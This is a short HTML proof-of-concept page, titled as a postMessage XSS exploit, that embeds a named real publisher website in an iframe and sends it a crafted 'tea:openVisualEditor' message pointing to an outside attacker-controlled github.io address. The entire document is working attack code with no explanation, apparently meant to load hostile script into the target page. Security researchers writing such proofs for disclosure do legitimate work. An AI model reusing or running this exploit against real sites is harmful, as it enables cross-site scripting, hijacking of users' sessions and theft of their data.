<html>
<body>
<h2>postMessage XSS PoC</h2>
<p id="status">Loading...</p>
<iframe id="target" 
  src="https://www.pangleglobal.com/publisher/companyInfo" 
  style="width:100%;height:500px">
</iframe>
<script>
  const ATTACKER = 'https://telojos11.github.io/cekcek';
  const iframe = document.getElementById('target');
  const status = document.getElementById('status');
  
  iframe.onload = () => {
    status.textContent = 'Step 1: iframe loaded, sending payload...';
    
    iframe.contentWindow.postMessage(JSON.stringify({
      type: 'tea:openVisualEditor',
      payload: { referrer: ATTACKER }
    }), '*');
    
    status.textContent = 'Step 2: Payload sent! Waiting for XSS...';
  };
</script>
</body>
</html>
